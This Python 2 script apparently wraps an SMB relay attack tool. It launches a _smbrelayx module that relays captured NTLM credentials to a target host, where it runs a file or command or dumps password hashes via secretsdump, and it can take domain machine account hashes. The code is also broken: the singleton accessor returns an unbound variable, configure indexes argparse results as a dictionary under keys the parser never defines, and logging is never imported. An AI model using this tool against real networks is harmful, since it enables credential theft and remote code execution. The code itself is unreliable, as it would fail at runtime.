import argparse
import sys
import time

from multiprocessing import Process

class SMBRelayX(object):

    instance = None

    @staticmethod
    def get_instance():
        if SMBRelayX.instance is None:
            instance = SMBRelayX()
        return instance
    
    def configure(self, options):

        noptions = {}
        noptions['codec'] = options['codec']
        noptions['debug'] = options['smbr_debug']
        noptions['target'] = options['target']
        noptions['executable'] = options['smbr_exec']
        noptions['command'] = options['command']
        noptions['return_status'] = options['return_status']
        noptions['outputfile'] = options['outputfile']
        noptions['one_shot'] = options['one_shot']
        noptions['machine_account'] = options['machine_account']
        noptions['machine_hashes'] = options['machine_hashes']
        noptions['domain'] = options['domain']

        self.options = noptions

    @staticmethod
    def _start(options):

        import _smbrelayx 
        _smbrelayx.run(options['codec'],
            options['debug'],
            options['target'],
            options['executable'],
            options['command'],
            options['return_status'],
            options['outputfile'],
            options['one_shot'],
            options['machine_account'],
            options['machine_hashes'],
            options['domain'])

    def start(self):
    
        self.proc = Process(target=self._start, args=(self.options,))
        self.proc.daemon = True
        self.proc.start()
        time.sleep(8)

    def stop(self):

        self.proc.terminate()
        self.proc.join()

if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument('--debug',
                    dest='debug',
                    action='store_true',
                    help='Turn DEBUG output ON')

    parser.add_argument('--target',
                dest='target',
                metavar='HOST',
                type=str,
                help='Host to relay the credentials to, if not it will relay it back to the client')

    parser.add_argument('--status',
                        dest='return_status',
                        choices={'success', 'denied', 'logon_failure'},
                        default='success',
                        help='Status to return after client performed authentication. Default: "success".')

    parser.add_argument('--executable',
                        type=str,
                        required=False,
                        metavar='FILE',
                        help='File to execute on the target system. If not specified, hashes will be dumped '
                        '(secretsdump.py must be in the same directory)')

    parser.add_argument('--command',
                        dest='command',
                        type=str,
                        required=False,
                        metavar='COMMAND',
                        help='Command to execute on target system. If not specified, hashes will be dumped '
                             '(secretsdump.py must be in the same directory)')

    parser.add_argument('--one-shot',
                        dest='one_shot',
                        action='store_true',
                        help='After successful authentication, only execute the attack once for each target')

    parser.add_argument('--codec',
                        dest='codec',
                        action='store',
                        help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/2.4/lib/standard-encodings.html and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % sys.getdefaultencoding())

    parser.add_argument('--outputfile',
                        dest='outputfile',
                        type=str,
                        help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')

    parser.add_argument('--machine-account',
                        dest='machine_account',
                        type=str,
                        required=False,
                        help='Domain machine account to use when interacting with the domain to grab a session key for '
                             'signing, format is domain/machine_name')

    parser.add_argument('--machine-hashes',
                        dest='machine_hashes',
                        type=str,
                        metavar="LMHASH:NTHASH",
                        help='Domain machine hashes, format is LMHASH:NTHASH')

    parser.add_argument('--domain',
                        dest='domain',
                        type=str,
                        help='Domain FQDN or IP to connect using NETLOGON')

    try:
       options = parser.parse_args()
    except Exception, e:
       logging.error(str(e))
       sys.exit(1)

    smb_relay = SMBRelayX.get_instance()
    smb_relay.configure(options)
    smb_relay.start()
